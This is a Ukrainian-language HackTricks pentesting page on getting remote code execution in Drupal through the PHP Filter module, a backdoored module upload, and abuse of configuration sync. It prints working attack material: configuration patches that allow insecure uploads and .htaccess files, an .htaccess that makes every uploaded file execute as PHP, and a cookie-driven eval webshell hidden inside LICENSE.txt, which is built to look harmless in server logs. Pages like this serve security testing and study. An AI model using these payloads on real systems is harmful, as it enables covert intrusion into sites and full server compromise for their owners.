# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## З модулем PHP Filter

> [!WARNING]
> У старіших версіях Drupal **(до версії 8)** було можливим увійти як адміністратор і **увімкнути модуль `PHP filter`**, який "дозволяє оцінювати вбудований PHP код/фрагменти." Але з версії 8 цей модуль не встановлюється за замовчуванням.

1. Перейдіть до **/modules/php** і якщо повертається помилка 403, то **плагін PHP filter встановлений, і ви можете продовжити**
1. Якщо ні, перейдіть до `Modules` і поставте галочку на `PHP Filter`, а потім натисніть `Save configuration`
2. Потім, щоб експлуатувати це, натисніть на `Add content`, виберіть `Basic Page` або `Article` і напишіть **PHP backdoor**, потім виберіть `PHP` код у текстовому форматі і нарешті виберіть `Preview`
3. Щоб активувати це, просто отримайте доступ до новоствореного вузла:
```bash
curl http://drupal.local/node/3
```
## Встановлення модуля PHP Filter

> [!WARNING]
> У поточних версіях більше неможливо встановлювати плагіни, маючи доступ лише до вебу після стандартної установки.

З версії **8 і далі,** [**модуль PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **не встановлюється за замовчуванням**. Щоб скористатися цією функціональністю, нам потрібно **встановити модуль самостійно**.

1. Завантажте найновішу версію модуля з веб-сайту Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Після завантаження перейдіть до **`Administration`** > **`Reports`** > **`Available updates`**.
3. Натисніть **`Browse`**, виберіть файл з директорії, куди ми його завантажили, а потім натисніть **`Install`**.
4. Після встановлення модуля ми можемо натиснути на **`Content`** і **створити нову базову сторінку**, подібно до того, як ми робили в прикладі Drupal 7. Знову ж таки, не забудьте **вибрати `PHP code` з випадаючого списку `Text format`**.

## Модуль з бекдором

> [!WARNING]
> У поточних версіях більше неможливо встановлювати плагіни, маючи доступ лише до вебу після стандартної установки.

Було можливим **завантажити** **модуль**, додати до нього **бекдор** і **встановити** його. Наприклад, завантажуючи модуль [**Trurnstile**](https://www.drupal.org/project/turnstile) у стиснутому форматі, створюючи новий файл PHP бекдору всередині нього, що дозволяє доступ до PHP файлу з файлом `.htaccess`:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
І потім перейти до **`http://drupal.local/admin/modules/install`**, щоб встановити модуль з бекдором і отримати доступ до **`/modules/turnstile/back.php`**, щоб виконати його.

## Бекдоринг Drupal з синхронізацією конфігурації <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Пост поділився** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Частина 1 (активація _Media_ та _Media Library_)

У меню _Extend_ (/admin/modules) ви можете активувати те, що здається плагінами, які вже встановлені. За замовчуванням плагіни _Media_ та _Media Library_ не активовані, тож давайте їх активуємо.

Перед активацією:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Після активації:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 2 (використання функції _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Ми використаємо функцію _Configuration synchronization_, щоб скинути (експортувати) та завантажити (імпортувати) записи конфігурації Drupal:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Патч system.file.yml**

Давайте почнемо з патчування першого запису `allow_insecure_uploads` з:

Файл: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

До:

Файл: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Патч field.field.media.document.field_media_document.yml**

Потім, патч другий запис `file_extensions` з: 

File: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

До:

Файл: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Я не використовую це в цьому блозі, але зазначено, що можливо визначити вхід `file_directory` довільним чином і що він вразливий до атаки обходу шляху (тому ми можемо піднятися назад у дереві файлової системи Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 3 (використання функції _Додати документ_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Останній крок є найпростішим і поділений на два підкроки. Перший - завантажити файл у форматі .htaccess, щоб використати директиви Apache і дозволити файлам .txt інтерпретуватися PHP-движком. Другий - завантажити файл .txt, що містить наш payload.

Файл: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Чому цей трюк класний?

Тому що, як тільки Webshell (який ми назвемо LICENSE.txt) буде завантажено на веб-сервер, ми зможемо передавати наші команди через `$_COOKIE`, і в журналах веб-сервера це з'явиться як легітимний GET запит до текстового файлу.

Чому ми називаємо наш Webshell LICENSE.txt?

Просто тому, що якщо ми візьмемо наступний файл, наприклад [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (який вже присутній в ядрі Drupal), ми маємо файл з 339 рядків і 17.6 КБ розміру, що ідеально підходить для додавання невеликого фрагмента PHP коду посередині (оскільки файл достатньо великий).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Файл: Виправлений LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Частина 3.1 (завантажити файл .htaccess)**

Спочатку ми використовуємо функцію _Add Document_ (/media/add/document) для завантаження нашого файлу, що містить директиви Apache (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Частина 3.2 (завантажити файл LICENSE.txt)**

Потім ми знову використовуємо функцію _Add Document_ (/media/add/document) для завантаження Webshell, прихованого в ліцензійному файлі.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Частина 4 (взаємодія з Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Остання частина полягає у взаємодії з Webshell.

Як показано на наступному скріншоті, якщо cookie, очікуваний нашим Webshell, не визначено, ми отримуємо наступний результат при зверненні до файлу через веб-браузер.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Коли атакуючий встановлює cookie, він може взаємодіяти з Webshell і виконувати будь-які команди, які хоче.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

І, як ви можете бачити в журналах, здається, що запитувався лише txt файл.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Дякуємо, що знайшли час прочитати цю статтю, сподіваюся, вона допоможе вам отримати кілька оболонок.

{{#include ../../../banners/hacktricks-training.md}}
